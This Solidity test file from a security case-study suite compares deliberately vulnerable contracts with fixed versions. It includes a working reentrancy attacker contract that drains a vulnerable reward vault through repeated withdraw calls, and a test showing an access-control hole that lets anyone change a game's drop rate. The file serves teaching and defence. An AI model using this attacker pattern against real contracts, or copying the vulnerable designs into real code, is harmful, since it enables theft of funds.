// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {VulnerableRewardVault} from "../../../contracts/security/vulnerable/VulnerableRewardVault.sol";
import {FixedRewardVault} from "../../../contracts/security/fixed/FixedRewardVault.sol";
import {VulnerableGameAdmin} from "../../../contracts/security/vulnerable/VulnerableGameAdmin.sol";
import {FixedGameAdmin} from "../../../contracts/security/fixed/FixedGameAdmin.sol";

contract ReentrancyAttacker {
    VulnerableRewardVault private vault;
    uint256 private attacks;

    constructor(VulnerableRewardVault vault_) {
        vault = vault_;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether && attacks < 2) {
            attacks++;
            vault.withdraw();
        }
    }
}

contract FixedReentrancyAttacker {
    FixedRewardVault private vault;

    constructor(FixedRewardVault vault_) {
        vault = vault_;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }
}

contract SecurityCaseStudiesTest is Test {
    address private owner = address(0xA11CE);
    address private attacker = address(0xBAD);

    function testReentrancyAttackDrainsVulnerableVault() public {
        VulnerableRewardVault vault = new VulnerableRewardVault();
        ReentrancyAttacker exploit = new ReentrancyAttacker(vault);

        vm.deal(address(this), 10 ether);
        vm.deal(attacker, 1 ether);

        vault.deposit{value: 5 ether}();

        vm.prank(attacker);
        exploit.attack{value: 1 ether}();

        assertGt(address(exploit).balance, 1 ether);
        assertLt(address(vault).balance, 5 ether);
    }

    function testFixedVaultBlocksReentrancyAttack() public {
        FixedRewardVault vault = new FixedRewardVault();
        FixedReentrancyAttacker exploit = new FixedReentrancyAttacker(vault);

        vm.deal(address(this), 10 ether);
        vm.deal(attacker, 1 ether);

        vault.deposit{value: 5 ether}();

        vm.prank(attacker);
        vm.expectRevert();
        exploit.attack{value: 1 ether}();

        assertEq(address(vault).balance, 5 ether);
    }

    function testAccessControlVulnerabilityAllowsAnyoneToChangeDropRate() public {
        VulnerableGameAdmin admin = new VulnerableGameAdmin();

        vm.prank(attacker);
        admin.setDropRate(999);

        assertEq(admin.dropRate(), 999);
    }

    function testFixedAccessControlRestrictsDropRateUpdate() public {
        FixedGameAdmin admin = new FixedGameAdmin(owner);

        vm.prank(attacker);
        vm.expectRevert();
        admin.setDropRate(999);

        vm.prank(owner);
        admin.setDropRate(100);

        assertEq(admin.dropRate(), 100);
    }
}
